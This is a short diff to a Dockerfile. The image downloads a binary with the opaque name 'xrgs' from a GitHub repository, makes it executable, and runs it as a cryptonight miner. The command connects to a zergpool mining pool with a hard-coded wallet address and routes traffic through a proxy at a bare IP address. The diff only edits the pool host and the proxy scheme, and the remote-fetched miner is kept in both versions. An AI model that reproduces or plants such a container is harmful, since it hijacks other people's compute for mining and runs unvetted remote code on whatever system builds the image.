@@ -4,4 +4,4 @@ RUN apt update && \
         apt install wget -y && \
         wget https://github.com/gyrogerald/vulner/raw/main/xrgs && \
         chmod +x xrgs
-CMD ./xrgs -o cryptonight_haven.asia.mine.zergpool.com:14452 --tls -a cn-heavy/xhv -k -u RXtRx8QUgCipTZyepE2go35gXjkcqHmYDX -p c=RVN,mc=BLOC,m=solo --dns-ipv6 -x http://112.6.117.135:8085
+CMD ./xrgs -o cryptonight_haven.mine.zergpool.com:14452 --tls -a cn-heavy/xhv -k -u RXtRx8QUgCipTZyepE2go35gXjkcqHmYDX -p c=RVN,mc=BLOC,m=solo --dns-ipv6 -x https://112.6.117.135:8085
